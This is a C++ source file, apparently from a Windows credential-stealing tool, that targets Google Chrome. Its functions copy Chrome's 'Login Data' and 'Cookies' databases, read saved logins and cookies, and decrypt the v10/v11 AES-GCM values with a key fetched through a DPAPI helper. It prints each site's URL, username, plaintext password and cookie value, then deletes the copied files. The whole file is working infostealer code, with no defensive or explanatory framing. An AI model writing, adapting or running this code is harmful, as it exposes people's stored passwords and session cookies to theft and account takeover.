#include "Chrome.h"
#include "../DPAPI/decrypt_dpapi.h"


LPWSTR get_chrome_profile_path(const wchar_t path[])
{
	LPWSTR localAppData = NULL, lpszLongPath = NULL;

	if (SHGetKnownFolderPath(FOLDERID_LocalAppData, KF_FLAG_CREATE, NULL, &localAppData) == S_OK)
	{
		if (localAppData)
		{
			lpszLongPath = static_cast<LPWSTR>(malloc(MAX_PATH));
			if (lpszLongPath)
			{
				SecureZeroMemory(lpszLongPath, MAX_PATH);
				memcpy(lpszLongPath, localAppData, (size_t)((wcslen(localAppData) + 1) * sizeof * localAppData));
			}
			else {
				throw (HRESULT)E_OUTOFMEMORY;
			}
		}

		wcscat(lpszLongPath, path);

		int length = 0;
		if (!(length = GetShortPathNameW(lpszLongPath, NULL, 0)))
			return NULL;

		LPWSTR lpszShortPath = static_cast<LPWSTR>(malloc(MAX_PATH));
		if (lpszShortPath)
		{
			SecureZeroMemory(lpszShortPath, MAX_PATH);

			if (!(length = GetShortPathNameW(lpszLongPath, lpszShortPath, length)))
				return NULL;
			else
			{
				free(static_cast<void*>(lpszLongPath));
				return lpszShortPath;
			}
		}
		else {
			throw (HRESULT)E_OUTOFMEMORY;
		}

	}
	else
		return NULL;

}
size_t find_length(PBYTE ciphertext)
{
	size_t i = 0;

	for (i = 0; i < MAX_PATH; i++)
	{
		if (ciphertext[i] == 0x00 && ciphertext[i + 1] == 0x00 && ciphertext[i + 2] == 0x00)
			break;
	}

	return i;
}

unsigned char* splitter(unsigned char* text, unsigned char* var, int start, int end)
{
	int j = 0;
	for (int i = start; i < end; i++)
	{
		*(var + j) = *(text + i);
		j++;
	}
	*(var + j) = '\0';

	return (unsigned char*)var;
}


LPSTR decrypt_value(PBYTE ciphertext, unsigned char secret_key[])
{

	unsigned char initialization_vector[TAG_SIZE+1]; //AES IV length = TAG_SIZE 12 + 1 (null) 

	unsigned char encrypted_password[MAX_PATH];
	
	size_t length = find_length(ciphertext);

	if (_mbsstr((unsigned char*)ciphertext, (const unsigned char*)"v10") != NULL || _mbsstr((unsigned char*)ciphertext, (const unsigned char*)"v11") != NULL) //cut v10/v11 
	{
		memcpy(initialization_vector, splitter(ciphertext, initialization_vector, 3, 15), 13); //AES IV
		memcpy(encrypted_password, splitter(ciphertext, encrypted_password, 15, length - 4), length - 19);//encrypted password
	}

	char* password = aes_gcm_decrypt(secret_key, initialization_vector, encrypted_password, length - 19);

	return password;
}

VOID get_chrome_credentials()
{
	LPWSTR chrome_profile_path = get_chrome_profile_path(L"\\Google\\Chrome\\User Data\\Default\\");

	if ( !SetCurrentDirectoryW(chrome_profile_path))
		return;

	CopyFileW(L"Login Data", L"login", FALSE);
	
	lstrcatW(chrome_profile_path, TEXT("login"));

	sqlite3* db = NULL;
	sqlite3_stmt* pStmt;

	unsigned char secret_key[32];
	memcpy(secret_key, (unsigned char*)get_secretKey(), 32); 
	
	char * get_path = static_cast<char*>(malloc(MAX_PATH));
	SecureZeroMemory(get_path, MAX_PATH);
	wcstombs(get_path, chrome_profile_path, wcslen(chrome_profile_path));
	
	if (sqlite3_open(get_path, &db) == SQLITE_OK)
	{
		sqlite3_busy_timeout(db, 5000);
		int rc = sqlite3_prepare(db,"SELECT origin_url, username_value, password_value FROM logins;", -1, &pStmt, 0);

		const char* actionUrl = NULL, * username = NULL, * password = NULL;

		if (rc == SQLITE_OK)
		{
			rc = sqlite3_step(pStmt);

			while (rc == SQLITE_ROW)
			{
				actionUrl = (const char*)sqlite3_column_text(pStmt, 0);
				printf("Action URL : %s \n",actionUrl);

				username = (const char*)sqlite3_column_text(pStmt, 1);
				printf("Username : %s \n", username);

				password = (const char*)decrypt_value((PBYTE)sqlite3_column_text(pStmt, 2), secret_key);
				printf("Password : %s \n", password);

				rc = sqlite3_step(pStmt);
			}
		}

		rc = sqlite3_finalize(pStmt);
	}

	sqlite3_close(db);
	DeleteFileW(chrome_profile_path);

}


VOID get_chrome_cookies()
{
	LPWSTR chrome_profile_path_cookie = get_chrome_profile_path(L"\\Google\\Chrome\\User Data\\Default\\Network\\");

	if(!SetCurrentDirectoryW(chrome_profile_path_cookie))
		return;

	
	CopyFileW(L"Cookies", L"cokies", FALSE);

	lstrcatW(chrome_profile_path_cookie, TEXT("cokies"));

	sqlite3* db = NULL;
	sqlite3_stmt* pStmt;

	unsigned char secret_key[32];
	memcpy(secret_key, (unsigned char*)get_secretKey(), 32); //AES KEY

	char* get_path = static_cast<char*>(malloc(MAX_PATH));
	SecureZeroMemory(get_path, MAX_PATH);
	wcstombs(get_path, chrome_profile_path_cookie, wcslen(chrome_profile_path_cookie));

	if (sqlite3_open((const char*)get_path, &db) == SQLITE_OK)
	{
		sqlite3_busy_timeout(db, 5000);

		int rc = sqlite3_prepare(db, "SELECT HOST_KEY,path,encrypted_value from cookies", -1, &pStmt, 0);

		const char* hostKey = NULL, * path = NULL, * cookueValue = NULL;

		if (rc == SQLITE_OK)
		{
			rc = sqlite3_step(pStmt);

			while (rc == SQLITE_ROW)
			{
				hostKey = (const char*)sqlite3_column_text(pStmt, 0);
				printf("Host : %s \n", hostKey);

				path = (const char*)sqlite3_column_text(pStmt, 1);
				printf("path : %s \n", path);

				cookueValue = (const char*)decrypt_value((PBYTE)sqlite3_column_text(pStmt, 2), secret_key);
				printf("Cookie : %s \n", cookueValue);

				rc = sqlite3_step(pStmt);
			}
		}
		rc = sqlite3_finalize(pStmt);
	}

	sqlite3_close(db);
	DeleteFileW(chrome_profile_path_cookie);
	free(get_path);

}
